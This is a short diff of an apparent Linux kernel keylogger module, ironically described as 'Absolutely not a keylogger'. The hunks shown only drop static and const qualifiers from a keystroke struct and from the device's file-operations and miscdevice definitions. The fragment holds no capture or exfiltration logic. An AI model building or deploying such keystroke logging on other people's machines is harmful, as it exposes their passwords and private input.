@@ -18,7 +18,7 @@ MODULE_DESCRIPTION("Absolutely not a keylogger.");
 #define LINE_SIZE 50
 #define FULL_NAME_SIZE 20
 
-static struct	key_stroke {
+struct	key_stroke {
 	unsigned int		keycode;
 	unsigned char		keysym;
 	char			full_name[FULL_NAME_SIZE];
@@ -277,13 +277,13 @@ static int	logs_close(struct inode *inode, struct file *file)
 	return 0;
 }
 
-static const struct file_operations	logs_fops = {
+static struct file_operations	logs_fops = {
 	.open = &logs_open,
 	.release = &logs_close,
 	.read = &logs_read,
 };
 
-static const struct miscdevice	logs_device = {
+static struct miscdevice	logs_device = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name = DEVICE_NAME,
 	.fops = &logs_fops
